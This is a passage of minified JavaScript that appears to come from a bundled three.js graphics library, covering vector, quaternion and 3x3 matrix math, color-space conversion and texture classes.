this.x-=e.x,this.y-=e.y,this}subScalar(e){return this.x-=e,this.y-=e,this}subVectors(e,i){return this.x=e.x-i.x,this.y=e.y-i.y,this}multiply(e){return this.x*=e.x,this.y*=e.y,this}multiplyScalar(e){return this.x*=e,this.y*=e,this}divide(e){return this.x/=e.x,this.y/=e.y,this}divideScalar(e){return this.multiplyScalar(1/e)}applyMatrix3(e){const i=this.x,s=this.y,c=e.elements;return this.x=c[0]*i+c[3]*s+c[6],this.y=c[1]*i+c[4]*s+c[7],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this}clamp(e,i){return this.x=Ne(this.x,e.x,i.x),this.y=Ne(this.y,e.y,i.y),this}clampScalar(e,i){return this.x=Ne(this.x,e,i),this.y=Ne(this.y,e,i),this}clampLength(e,i){const s=this.length();return this.divideScalar(s||1).multiplyScalar(Ne(s,e,i))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this}negate(){return this.x=-this.x,this.y=-this.y,this}dot(e){return this.x*e.x+this.y*e.y}cross(e){return this.x*e.y-this.y*e.x}lengthSq(){return this.x*this.x+this.y*this.y}length(){return Math.sqrt(this.x*this.x+this.y*this.y)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)}normalize(){return this.divideScalar(this.length()||1)}angle(){return Math.atan2(-this.y,-this.x)+Math.PI}angleTo(e){const i=Math.sqrt(this.lengthSq()*e.lengthSq());if(i===0)return Math.PI/2;const s=this.dot(e)/i;return Math.acos(Ne(s,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const i=this.x-e.x,s=this.y-e.y;return i*i+s*s}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,i){return this.x+=(e.x-this.x)*i,this.y+=(e.y-this.y)*i,this}lerpVectors(e,i,s){return this.x=e.x+(i.x-e.x)*s,this.y=e.y+(i.y-e.y)*s,this}equals(e){return e.x===this.x&&e.y===this.y}fromArray(e,i=0){return this.x=e[i],this.y=e[i+1],this}toArray(e=[],i=0){return e[i]=this.x,e[i+1]=this.y,e}fromBufferAttribute(e,i){return this.x=e.getX(i),this.y=e.getY(i),this}rotateAround(e,i){const s=Math.cos(i),c=Math.sin(i),f=this.x-e.x,d=this.y-e.y;return this.x=f*s-d*c+e.x,this.y=f*c+d*s+e.y,this}random(){return this.x=Math.random(),this.y=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y}};am.prototype.isVector2=!0;let Ue=am;class ro{constructor(e=0,i=0,s=0,c=1){this.isQuaternion=!0,this._x=e,this._y=i,this._z=s,this._w=c}static slerpFlat(e,i,s,c,f,d,h){let m=s[c+0],p=s[c+1],x=s[c+2],v=s[c+3],_=f[d+0],E=f[d+1],T=f[d+2],w=f[d+3];if(v!==w||m!==_||p!==E||x!==T){let y=m*_+p*E+x*T+v*w;y<0&&(_=-_,E=-E,T=-T,w=-w,y=-y);let S=1-h;if(y<.9995){const N=Math.acos(y),B=Math.sin(N);S=Math.sin(S*N)/B,h=Math.sin(h*N)/B,m=m*S+_*h,p=p*S+E*h,x=x*S+T*h,v=v*S+w*h}else{m=m*S+_*h,p=p*S+E*h,x=x*S+T*h,v=v*S+w*h;const N=1/Math.sqrt(m*m+p*p+x*x+v*v);m*=N,p*=N,x*=N,v*=N}}e[i]=m,e[i+1]=p,e[i+2]=x,e[i+3]=v}static multiplyQuaternionsFlat(e,i,s,c,f,d){const h=s[c],m=s[c+1],p=s[c+2],x=s[c+3],v=f[d],_=f[d+1],E=f[d+2],T=f[d+3];return e[i]=h*T+x*v+m*E-p*_,e[i+1]=m*T+x*_+p*v-h*E,e[i+2]=p*T+x*E+h*_-m*v,e[i+3]=x*T-h*v-m*_-p*E,e}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get w(){return this._w}set w(e){this._w=e,this._onChangeCallback()}set(e,i,s,c){return this._x=e,this._y=i,this._z=s,this._w=c,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._w)}copy(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this}setFromEuler(e,i=!0){const s=e._x,c=e._y,f=e._z,d=e._order,h=Math.cos,m=Math.sin,p=h(s/2),x=h(c/2),v=h(f/2),_=m(s/2),E=m(c/2),T=m(f/2);switch(d){case"XYZ":this._x=_*x*v+p*E*T,this._y=p*E*v-_*x*T,this._z=p*x*T+_*E*v,this._w=p*x*v-_*E*T;break;case"YXZ":this._x=_*x*v+p*E*T,this._y=p*E*v-_*x*T,this._z=p*x*T-_*E*v,this._w=p*x*v+_*E*T;break;case"ZXY":this._x=_*x*v-p*E*T,this._y=p*E*v+_*x*T,this._z=p*x*T+_*E*v,this._w=p*x*v-_*E*T;break;case"ZYX":this._x=_*x*v-p*E*T,this._y=p*E*v+_*x*T,this._z=p*x*T-_*E*v,this._w=p*x*v+_*E*T;break;case"YZX":this._x=_*x*v+p*E*T,this._y=p*E*v+_*x*T,this._z=p*x*T-_*E*v,this._w=p*x*v-_*E*T;break;case"XZY":this._x=_*x*v-p*E*T,this._y=p*E*v-_*x*T,this._z=p*x*T+_*E*v,this._w=p*x*v+_*E*T;break;default:se("Quaternion: .setFromEuler() encountered an unknown order: "+d)}return i===!0&&this._onChangeCallback(),this}setFromAxisAngle(e,i){const s=i/2,c=Math.sin(s);return this._x=e.x*c,this._y=e.y*c,this._z=e.z*c,this._w=Math.cos(s),this._onChangeCallback(),this}setFromRotationMatrix(e){const i=e.elements,s=i[0],c=i[4],f=i[8],d=i[1],h=i[5],m=i[9],p=i[2],x=i[6],v=i[10],_=s+h+v;if(_>0){const E=.5/Math.sqrt(_+1);this._w=.25/E,this._x=(x-m)*E,this._y=(f-p)*E,this._z=(d-c)*E}else if(s>h&&s>v){const E=2*Math.sqrt(1+s-h-v);this._w=(x-m)/E,this._x=.25*E,this._y=(c+d)/E,this._z=(f+p)/E}else if(h>v){const E=2*Math.sqrt(1+h-s-v);this._w=(f-p)/E,this._x=(c+d)/E,this._y=.25*E,this._z=(m+x)/E}else{const E=2*Math.sqrt(1+v-s-h);this._w=(d-c)/E,this._x=(f+p)/E,this._y=(m+x)/E,this._z=.25*E}return this._onChangeCallback(),this}setFromUnitVectors(e,i){let s=e.dot(i)+1;return s<1e-8?(s=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0,this._w=s):(this._x=0,this._y=-e.z,this._z=e.y,this._w=s)):(this._x=e.y*i.z-e.z*i.y,this._y=e.z*i.x-e.x*i.z,this._z=e.x*i.y-e.y*i.x,this._w=s),this.normalize()}angleTo(e){return 2*Math.acos(Math.abs(Ne(this.dot(e),-1,1)))}rotateTowards(e,i){const s=this.angleTo(e);if(s===0)return this;const c=Math.min(1,i/s);return this.slerp(e,c),this}identity(){return this.set(0,0,0,1)}invert(){return this.conjugate()}conjugate(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this}dot(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w}lengthSq(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w}length(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)}normalize(){let e=this.length();return e===0?(this._x=0,this._y=0,this._z=0,this._w=1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w=this._w*e),this._onChangeCallback(),this}multiply(e){return this.multiplyQuaternions(this,e)}premultiply(e){return this.multiplyQuaternions(e,this)}multiplyQuaternions(e,i){const s=e._x,c=e._y,f=e._z,d=e._w,h=i._x,m=i._y,p=i._z,x=i._w;return this._x=s*x+d*h+c*p-f*m,this._y=c*x+d*m+f*h-s*p,this._z=f*x+d*p+s*m-c*h,this._w=d*x-s*h-c*m-f*p,this._onChangeCallback(),this}slerp(e,i){let s=e._x,c=e._y,f=e._z,d=e._w,h=this.dot(e);h<0&&(s=-s,c=-c,f=-f,d=-d,h=-h);let m=1-i;if(h<.9995){const p=Math.acos(h),x=Math.sin(p);m=Math.sin(m*p)/x,i=Math.sin(i*p)/x,this._x=this._x*m+s*i,this._y=this._y*m+c*i,this._z=this._z*m+f*i,this._w=this._w*m+d*i,this._onChangeCallback()}else this._x=this._x*m+s*i,this._y=this._y*m+c*i,this._z=this._z*m+f*i,this._w=this._w*m+d*i,this.normalize();return this}slerpQuaternions(e,i,s){return this.copy(e).slerp(i,s)}random(){const e=2*Math.PI*Math.random(),i=2*Math.PI*Math.random(),s=Math.random(),c=Math.sqrt(1-s),f=Math.sqrt(s);return this.set(c*Math.sin(e),c*Math.cos(e),f*Math.sin(i),f*Math.cos(i))}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w}fromArray(e,i=0){return this._x=e[i],this._y=e[i+1],this._z=e[i+2],this._w=e[i+3],this._onChangeCallback(),this}toArray(e=[],i=0){return e[i]=this._x,e[i+1]=this._y,e[i+2]=this._z,e[i+3]=this._w,e}fromBufferAttribute(e,i){return this._x=e.getX(i),this._y=e.getY(i),this._z=e.getZ(i),this._w=e.getW(i),this._onChangeCallback(),this}toJSON(){return this.toArray()}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._w}}const rm=class rm{constructor(e=0,i=0,s=0){this.x=e,this.y=i,this.z=s}set(e,i,s){return s===void 0&&(s=this.z),this.x=e,this.y=i,this.z=s,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setComponent(e,i){switch(e){case 0:this.x=i;break;case 1:this.y=i;break;case 2:this.z=i;break;default:throw new Error("THREE.Vector3: index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("THREE.Vector3: index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this}addVectors(e,i){return this.x=e.x+i.x,this.y=e.y+i.y,this.z=e.z+i.z,this}addScaledVector(e,i){return this.x+=e.x*i,this.y+=e.y*i,this.z+=e.z*i,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this}subVectors(e,i){return this.x=e.x-i.x,this.y=e.y-i.y,this.z=e.z-i.z,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this}multiplyVectors(e,i){return this.x=e.x*i.x,this.y=e.y*i.y,this.z=e.z*i.z,this}applyEuler(e){return this.applyQuaternion(wv.setFromEuler(e))}applyAxisAngle(e,i){return this.applyQuaternion(wv.setFromAxisAngle(e,i))}applyMatrix3(e){const i=this.x,s=this.y,c=this.z,f=e.elements;return this.x=f[0]*i+f[3]*s+f[6]*c,this.y=f[1]*i+f[4]*s+f[7]*c,this.z=f[2]*i+f[5]*s+f[8]*c,this}applyNormalMatrix(e){return this.applyMatrix3(e).normalize()}applyMatrix4(e){const i=this.x,s=this.y,c=this.z,f=e.elements,d=1/(f[3]*i+f[7]*s+f[11]*c+f[15]);return this.x=(f[0]*i+f[4]*s+f[8]*c+f[12])*d,this.y=(f[1]*i+f[5]*s+f[9]*c+f[13])*d,this.z=(f[2]*i+f[6]*s+f[10]*c+f[14])*d,this}applyQuaternion(e){const i=this.x,s=this.y,c=this.z,f=e.x,d=e.y,h=e.z,m=e.w,p=2*(d*c-h*s),x=2*(h*i-f*c),v=2*(f*s-d*i);return this.x=i+m*p+d*v-h*x,this.y=s+m*x+h*p-f*v,this.z=c+m*v+f*x-d*p,this}project(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)}unproject(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)}transformDirection(e){const i=this.x,s=this.y,c=this.z,f=e.elements;return this.x=f[0]*i+f[4]*s+f[8]*c,this.y=f[1]*i+f[5]*s+f[9]*c,this.z=f[2]*i+f[6]*s+f[10]*c,this.normalize()}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this}divideScalar(e){return this.multiplyScalar(1/e)}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this}clamp(e,i){return this.x=Ne(this.x,e.x,i.x),this.y=Ne(this.y,e.y,i.y),this.z=Ne(this.z,e.z,i.z),this}clampScalar(e,i){return this.x=Ne(this.x,e,i),this.y=Ne(this.y,e,i),this.z=Ne(this.z,e,i),this}clampLength(e,i){const s=this.length();return this.divideScalar(s||1).multiplyScalar(Ne(s,e,i))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,i){return this.x+=(e.x-this.x)*i,this.y+=(e.y-this.y)*i,this.z+=(e.z-this.z)*i,this}lerpVectors(e,i,s){return this.x=e.x+(i.x-e.x)*s,this.y=e.y+(i.y-e.y)*s,this.z=e.z+(i.z-e.z)*s,this}cross(e){return this.crossVectors(this,e)}crossVectors(e,i){const s=e.x,c=e.y,f=e.z,d=i.x,h=i.y,m=i.z;return this.x=c*m-f*h,this.y=f*d-s*m,this.z=s*h-c*d,this}projectOnVector(e){const i=e.lengthSq();if(i===0)return this.set(0,0,0);const s=e.dot(this)/i;return this.copy(e).multiplyScalar(s)}projectOnPlane(e){return bh.copy(this).projectOnVector(e),this.sub(bh)}reflect(e){return this.sub(bh.copy(e).multiplyScalar(2*this.dot(e)))}angleTo(e){const i=Math.sqrt(this.lengthSq()*e.lengthSq());if(i===0)return Math.PI/2;const s=this.dot(e)/i;return Math.acos(Ne(s,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const i=this.x-e.x,s=this.y-e.y,c=this.z-e.z;return i*i+s*s+c*c}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)}setFromSpherical(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)}setFromSphericalCoords(e,i,s){const c=Math.sin(i)*e;return this.x=c*Math.sin(s),this.y=Math.cos(i)*e,this.z=c*Math.cos(s),this}setFromCylindrical(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)}setFromCylindricalCoords(e,i,s){return this.x=e*Math.sin(i),this.y=s,this.z=e*Math.cos(i),this}setFromMatrixPosition(e){const i=e.elements;return this.x=i[12],this.y=i[13],this.z=i[14],this}setFromMatrixScale(e){const i=this.setFromMatrixColumn(e,0).length(),s=this.setFromMatrixColumn(e,1).length(),c=this.setFromMatrixColumn(e,2).length();return this.x=i,this.y=s,this.z=c,this}setFromMatrixColumn(e,i){return this.fromArray(e.elements,i*4)}setFromMatrix3Column(e,i){return this.fromArray(e.elements,i*3)}setFromEuler(e){return this.x=e._x,this.y=e._y,this.z=e._z,this}setFromColor(e){return this.x=e.r,this.y=e.g,this.z=e.b,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z}fromArray(e,i=0){return this.x=e[i],this.y=e[i+1],this.z=e[i+2],this}toArray(e=[],i=0){return e[i]=this.x,e[i+1]=this.y,e[i+2]=this.z,e}fromBufferAttribute(e,i){return this.x=e.getX(i),this.y=e.getY(i),this.z=e.getZ(i),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this}randomDirection(){const e=Math.random()*Math.PI*2,i=Math.random()*2-1,s=Math.sqrt(1-i*i);return this.x=s*Math.cos(e),this.y=i,this.z=s*Math.sin(e),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z}};rm.prototype.isVector3=!0;let it=rm;const bh=new it,wv=new ro,sm=class sm{constructor(e,i,s,c,f,d,h,m,p){this.elements=[1,0,0,0,1,0,0,0,1],e!==void 0&&this.set(e,i,s,c,f,d,h,m,p)}set(e,i,s,c,f,d,h,m,p){const x=this.elements;return x[0]=e,x[1]=c,x[2]=h,x[3]=i,x[4]=f,x[5]=m,x[6]=s,x[7]=d,x[8]=p,this}identity(){return this.set(1,0,0,0,1,0,0,0,1),this}copy(e){const i=this.elements,s=e.elements;return i[0]=s[0],i[1]=s[1],i[2]=s[2],i[3]=s[3],i[4]=s[4],i[5]=s[5],i[6]=s[6],i[7]=s[7],i[8]=s[8],this}extractBasis(e,i,s){return e.setFromMatrix3Column(this,0),i.setFromMatrix3Column(this,1),s.setFromMatrix3Column(this,2),this}setFromMatrix4(e){const i=e.elements;return this.set(i[0],i[4],i[8],i[1],i[5],i[9],i[2],i[6],i[10]),this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,i){const s=e.elements,c=i.elements,f=this.elements,d=s[0],h=s[3],m=s[6],p=s[1],x=s[4],v=s[7],_=s[2],E=s[5],T=s[8],w=c[0],y=c[3],S=c[6],N=c[1],B=c[4],C=c[7],U=c[2],D=c[5],P=c[8];return f[0]=d*w+h*N+m*U,f[3]=d*y+h*B+m*D,f[6]=d*S+h*C+m*P,f[1]=p*w+x*N+v*U,f[4]=p*y+x*B+v*D,f[7]=p*S+x*C+v*P,f[2]=_*w+E*N+T*U,f[5]=_*y+E*B+T*D,f[8]=_*S+E*C+T*P,this}multiplyScalar(e){const i=this.elements;return i[0]*=e,i[3]*=e,i[6]*=e,i[1]*=e,i[4]*=e,i[7]*=e,i[2]*=e,i[5]*=e,i[8]*=e,this}determinant(){const e=this.elements,i=e[0],s=e[1],c=e[2],f=e[3],d=e[4],h=e[5],m=e[6],p=e[7],x=e[8];return i*d*x-i*h*p-s*f*x+s*h*m+c*f*p-c*d*m}invert(){const e=this.elements,i=e[0],s=e[1],c=e[2],f=e[3],d=e[4],h=e[5],m=e[6],p=e[7],x=e[8],v=x*d-h*p,_=h*m-x*f,E=p*f-d*m,T=i*v+s*_+c*E;if(T===0)return this.set(0,0,0,0,0,0,0,0,0);const w=1/T;return e[0]=v*w,e[1]=(c*p-x*s)*w,e[2]=(h*s-c*d)*w,e[3]=_*w,e[4]=(x*i-c*m)*w,e[5]=(c*f-h*i)*w,e[6]=E*w,e[7]=(s*m-p*i)*w,e[8]=(d*i-s*f)*w,this}transpose(){let e;const i=this.elements;return e=i[1],i[1]=i[3],i[3]=e,e=i[2],i[2]=i[6],i[6]=e,e=i[5],i[5]=i[7],i[7]=e,this}getNormalMatrix(e){return this.setFromMatrix4(e).invert().transpose()}transposeIntoArray(e){const i=this.elements;return e[0]=i[0],e[1]=i[3],e[2]=i[6],e[3]=i[1],e[4]=i[4],e[5]=i[7],e[6]=i[2],e[7]=i[5],e[8]=i[8],this}setUvTransform(e,i,s,c,f,d,h){const m=Math.cos(f),p=Math.sin(f);return this.set(s*m,s*p,-s*(m*d+p*h)+d+e,-c*p,c*m,-c*(-p*d+m*h)+h+i,0,0,1),this}scale(e,i){return eo("Matrix3: .scale() is deprecated. Use .makeScale() instead."),this.premultiply(Th.makeScale(e,i)),this}rotate(e){return eo("Matrix3: .rotate() is deprecated. Use .makeRotation() instead."),this.premultiply(Th.makeRotation(-e)),this}translate(e,i){return eo("Matrix3: .translate() is deprecated. Use .makeTranslation() instead."),this.premultiply(Th.makeTranslation(e,i)),this}makeTranslation(e,i){return e.isVector2?this.set(1,0,e.x,0,1,e.y,0,0,1):this.set(1,0,e,0,1,i,0,0,1),this}makeRotation(e){const i=Math.cos(e),s=Math.sin(e);return this.set(i,-s,0,s,i,0,0,0,1),this}makeScale(e,i){return this.set(e,0,0,0,i,0,0,0,1),this}equals(e){const i=this.elements,s=e.elements;for(let c=0;c<9;c++)if(i[c]!==s[c])return!1;return!0}fromArray(e,i=0){for(let s=0;s<9;s++)this.elements[s]=e[s+i];return this}toArray(e=[],i=0){const s=this.elements;return e[i]=s[0],e[i+1]=s[1],e[i+2]=s[2],e[i+3]=s[3],e[i+4]=s[4],e[i+5]=s[5],e[i+6]=s[6],e[i+7]=s[7],e[i+8]=s[8],e}clone(){return new this.constructor().fromArray(this.elements)}};sm.prototype.isMatrix3=!0;let de=sm;const Th=new de,Nv=new de().set(.4123908,.3575843,.1804808,.212639,.7151687,.0721923,.0193308,.1191948,.9505322),Dv=new de().set(3.2409699,-1.5373832,-.4986108,-.9692436,1.8759675,.0415551,.0556301,-.203977,1.0569715);function tb(){const o={enabled:!0,workingColorSpace:wu,spaces:{},convert:function(c,f,d){return this.enabled===!1||f===d||!f||!d||(this.spaces[f].transfer===qe&&(c.r=Ua(c.r),c.g=Ua(c.g),c.b=Ua(c.b)),this.spaces[f].primaries!==this.spaces[d].primaries&&(c.applyMatrix3(this.spaces[f].toXYZ),c.applyMatrix3(this.spaces[d].fromXYZ)),this.spaces[d].transfer===qe&&(c.r=no(c.r),c.g=no(c.g),c.b=no(c.b))),c},workingToColorSpace:function(c,f){return this.convert(c,this.workingColorSpace,f)},colorSpaceToWorking:function(c,f){return this.convert(c,f,this.workingColorSpace)},getPrimaries:function(c){return this.spaces[c].primaries},getTransfer:function(c){return c===gr?Nu:this.spaces[c].transfer},getToneMappingMode:function(c){return this.spaces[c].outputColorSpaceConfig.toneMappingMode||"standard"},getLuminanceCoefficients:function(c,f=this.workingColorSpace){return c.fromArray(this.spaces[f].luminanceCoefficients)},define:function(c){Object.assign(this.spaces,c)},_getMatrix:function(c,f,d){return c.copy(this.spaces[f].toXYZ).multiply(this.spaces[d].fromXYZ)},_getDrawingBufferColorSpace:function(c){return this.spaces[c].outputColorSpaceConfig.drawingBufferColorSpace},_getUnpackColorSpace:function(c=this.workingColorSpace){return this.spaces[c].workingColorSpaceConfig.unpackColorSpace},fromWorkingColorSpace:function(c,f){return eo("ColorManagement: .fromWorkingColorSpace() has been renamed to .workingToColorSpace()."),o.workingToColorSpace(c,f)},toWorkingColorSpace:function(c,f){return eo("ColorManagement: .toWorkingColorSpace() has been renamed to .colorSpaceToWorking()."),o.colorSpaceToWorking(c,f)}},e=[.64,.33,.3,.6,.15,.06],i=[.2126,.7152,.0722],s=[.3127,.329];return o.define({[wu]:{primaries:e,whitePoint:s,transfer:Nu,toXYZ:Nv,fromXYZ:Dv,luminanceCoefficients:i,workingColorSpaceConfig:{unpackColorSpace:bi},outputColorSpaceConfig:{drawingBufferColorSpace:bi}},[bi]:{primaries:e,whitePoint:s,transfer:qe,toXYZ:Nv,fromXYZ:Dv,luminanceCoefficients:i,outputColorSpaceConfig:{drawingBufferColorSpace:bi}}}),o}const we=tb();function Ua(o){return o<.04045?o*.0773993808:Math.pow(o*.9478672986+.0521327014,2.4)}function no(o){return o<.0031308?o*12.92:1.055*Math.pow(o,.41666)-.055}let Hs;class eb{static getDataURL(e,i="image/png"){if(/^data:/i.test(e.src)||typeof HTMLCanvasElement>"u")return e.src;let s;if(e instanceof HTMLCanvasElement)s=e;else{Hs===void 0&&(Hs=Uu("canvas")),Hs.width=e.width,Hs.height=e.height;const c=Hs.getContext("2d");e instanceof ImageData?c.putImageData(e,0,0):c.drawImage(e,0,0,e.width,e.height),s=Hs}return s.toDataURL(i)}static sRGBToLinear(e){if(typeof HTMLImageElement<"u"&&e instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&e instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&e instanceof ImageBitmap){const i=Uu("canvas");i.width=e.width,i.height=e.height;const s=i.getContext("2d");s.drawImage(e,0,0,e.width,e.height);const c=s.getImageData(0,0,e.width,e.height),f=c.data;for(let d=0;d<f.length;d++)f[d]=Ua(f[d]/255)*255;return s.putImageData(c,0,0),i}else if(e.data){const i=e.data.slice(0);for(let s=0;s<i.length;s++)i instanceof Uint8Array||i instanceof Uint8ClampedArray?i[s]=Math.floor(Ua(i[s]/255)*255):i[s]=Ua(i[s]);return{data:i,width:e.width,height:e.height}}else return se("ImageUtils.sRGBToLinear(): Unsupported image type. No color space conversion applied."),e}}let nb=0;class tm{constructor(e=null){this.isTextureSource=!0,Object.defineProperty(this,"id",{value:nb++}),this.uuid=yl(),this.data=e,this.dataReady=!0,this.version=0}getSize(e){const i=this.data;return typeof HTMLVideoElement<"u"&&i instanceof HTMLVideoElement?e.set(i.videoWidth,i.videoHeight,0):typeof VideoFrame<"u"&&i instanceof VideoFrame?e.set(i.displayWidth,i.displayHeight,0):i!==null?e.set(i.width,i.height,i.depth||0):e.set(0,0,0),e}set needsUpdate(e){e===!0&&this.version++}toJSON(e){const i=e===void 0||typeof e=="string";if(!i&&e.images[this.uuid]!==void 0)return e.images[this.uuid];const s={uuid:this.uuid,url:""},c=this.data;if(c!==null){let f;if(Array.isArray(c)){f=[];for(let d=0,h=c.length;d<h;d++)c[d].isDataTexture?f.push(Ah(c[d].image)):f.push(Ah(c[d]))}else f=Ah(c);s.url=f}return i||(e.images[this.uuid]=s),s}}function Ah(o){return typeof HTMLImageElement<"u"&&o instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&o instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&o instanceof ImageBitmap?eb.getDataURL(o):o.data?{data:Array.from(o.data),width:o.width,height:o.height,type:o.data.constructor.name}:(se("Texture: Unable to serialize Texture."),{})}let ib=0;const Rh=new it;class Xn extends Jr{constructor(e=Xn.DEFAULT_IMAGE,i=Xn.DEFAULT_MAPPING,s=Na,c=Na,f=In,d=qr,h=zi,m=Ai,p=Xn.DEFAULT_ANISOTROPY,x=gr){super(),this.isTexture=!0,Object.defineProperty(this,"id",{value:ib++}),this.uuid=yl(),this.name="",this.source=new tm(e),this.mipmaps=[],this.mapping=i,this.channel=0,this.wrapS=s,this.wrapT=c,this.magFilter=f,this.minFilter=d,this.anisotropy=p,this.format=h,this.internalFormat=null,this.type=m,this.offset=new Ue(0,0),this.repeat=new Ue(1,1),this.center=new Ue(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new de,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.colorSpace=x,this.userData={},this.updateRanges=[],this.version=0,this.onUpdate=null,this.renderTarget=null,this.isRenderTargetTexture=!1,this.isArrayTexture=!!(e&&e.depth&&e.depth>1),this.pmremVersion=0,this.normalized=!1}get width(){return this.source.getSize(Rh).x}get height(){return this.source.getSize(Rh).y}get depth(){return this.source.getSize(Rh).z}get image(){return this.source.data}set image(e){this.source.data=e}updateMatrix(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)}addUpdateRange(e,i){this.updateRanges.push({start:e,count:i})}clearUpdateRanges(){this.updateRanges.length=0}clone(){return new this.constructor().copy(this)}copy(e){return this.name=e.name,this.source=e.source,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.channel=e.channel,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.internalFormat=e.internalFormat,this.type=e.type,this.normalized=e.normalized,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.colorSpace=e.colorSpace,this.renderTarget=e.renderTarget,this.isRenderTargetTexture=e.isRenderTargetTexture,this.isArrayTexture=e.isArrayTexture,this.userData=JSON.parse(JSON.stringify(e.userData)),this.needsUpdate=!0,this}setValues(e){for(const i in e){const s=e[i];if(s===void 0){se(`Texture.setValues(): parameter '${i}' has value of undefined.`);continue}const c=this[i];if(c===void 0){se(`Texture.setValues(): property '${i}' does not exist.`);continue}c&&s&&c.isVector2&&s.isVector2||c&&s&&c.isVector3&&s.isVector3||c&&s&&c.isMatrix3&&s.isMatrix3?c.copy(s):this[i]=s}}toJSON(e){const i=e===void 0||typeof e=="string";if(!i&&e.textures[this.uuid]!==void 0)return e.textures[this.uuid];const 